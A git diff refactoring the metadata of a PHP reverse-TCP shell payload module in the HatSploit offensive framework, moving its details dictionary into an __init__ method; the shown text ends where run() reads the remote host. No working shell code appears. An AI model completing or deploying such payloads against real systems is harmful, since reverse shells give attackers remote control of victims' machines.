@@ -7,18 +7,21 @@ from hatsploit.lib.payload import Payload
 
 
 class HatSploitPayload(Payload):
-    details = {
-        'Name': "PHP Shell Reverse TCP",
-        'Payload': "unix/generic/php_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer',
-        ],
-        'Description': "PHP shell reverse TCP payload.",
-        'Architecture': "generic",
-        'Platform': "unix",
-        'Rank': "high",
-        'Type': "reverse_tcp",
-    }
+    def __init__(self):
+        super().__init__()
+
+        self.details = {
+            'Name': "PHP Shell Reverse TCP",
+            'Payload': "unix/generic/php_reverse_tcp",
+            'Authors': [
+                'Ivan Nikolsky (enty8080) - payload developer',
+            ],
+            'Description': "PHP shell reverse TCP payload.",
+            'Architecture': "generic",
+            'Platform': "unix",
+            'Rank': "high",
+            'Type': "reverse_tcp",
+        }
 
     def run(self):
         remote_host = self.handler['RHOST']
